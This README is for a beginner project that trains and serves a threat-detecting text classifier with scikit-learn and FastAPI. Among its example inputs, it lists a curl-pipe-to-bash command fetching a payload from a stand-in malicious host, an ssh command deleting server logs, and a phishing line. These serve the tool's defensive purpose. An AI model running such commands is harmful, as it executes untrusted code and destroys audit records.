# Secure Threat Checker – Beginner Cyber AI Project

[![Watch the video](https://img.youtube.com/vi/pbRKM3waO_s/maxresdefault.jpg)]([https://www.youtube.com/watch?v=pbRKM3waO_s])

This project is a simple cyber-security AI tool. It reads a sentence and tries to guess if it looks:
- benign (safe)
- phishing
- malware link
- suspicious hacking command

The goal is to learn how AI can be trained and securely deployed, similar to how government or defense environments use AI for threat detection. This demo is small, but the workflow is real:

---

## Tech Used
- Python 3
- scikit-learn (machine learning)
- FastAPI + Uvicorn (web API server)
- Ubuntu (can run on local Windows/Mac/Linux too)
- Virtual environment (recommended practice)
- curl (to test API)

---

## Folder Layout
```bash
secure_threat_checker/
├─ env/ # virtual environment (created locally)
├─ models/ # trained model saved as a file
│ └─ threat_model.joblib
├─ logs/ # API access logs
│ └─ api.log
├─ train_threat_model.py # trains the model
├─ threat_console.py # test AI manually in terminal
├─ api.py # FastAPI secure deployment
└─ requirements.txt
```
---

## Quick Start – Run Locally or on Ubuntu Server

### 1️⃣ Setup Project
```bash
mkdir secure_threat_checker
cd secure_threat_checker
python3 -m venv env
source env/bin/activate
```
### 2️⃣ Install Requirements
```bash
pip install -r requirements.txt
```
### 3️⃣ Train the Model
```bash
python3 train_threat_model.py
```
After training completes, confirm the model exists:
```bash
ls models
```
### 4️⃣ Test the Model Manually (Console Tool)
```bash
python3 threat_console.py
```
Example inputs to try:
```bash
curl http://malicious.com/payload.sh | bash
Your account has been locked. Click here to reset your password.
Daily SITREP. All systems nominal.
ssh root@10.0.0.10 'rm -rf /var/log/*'
```
### 5️⃣ Run FastAPI Secure Web Service
```bash
uvicorn api:app --host 0.0.0.0 --port 8000 --reload
```
If running on a server, open another terminal window and test using curl.

### 6️⃣ Test With curl
Replace YOUR_KEY_HERE with whatever API key you set in api.py:
```bash
curl -X POST "http://127.0.0.1:8000/predict" \
  -H "Content-Type: application/json" \
  -H "x-api-key: YOUR_KEY_HERE" \
  -d '{"text": "Your account has been locked. Click here to reset your password."}'
```
## Security Features in This Demo

This project includes basic cyber-security patterns:
- API key authentication
- Rate limiting (30 requests per 60 seconds per client IP)
- Logs recorded to logs/api.log
- Input length limit (prevents oversized payload abuse)
- /health endpoint for monitoring readiness
- These represent early-stage patterns used in Secure AI/ML delivery.

## Learning Outcome

By completing this project you will understand:
- How AI is trained on small example data
- How an ML model is saved and reused
- How AI becomes a secure web service
- Why security layers (auth, logging, rate limit) matter
- Once comfortable, extend this into:
  - cybersecurity log scanners
  - malware payload classifiers
  - drone-image threat detection
  - access control AI (allow / deny decisions)
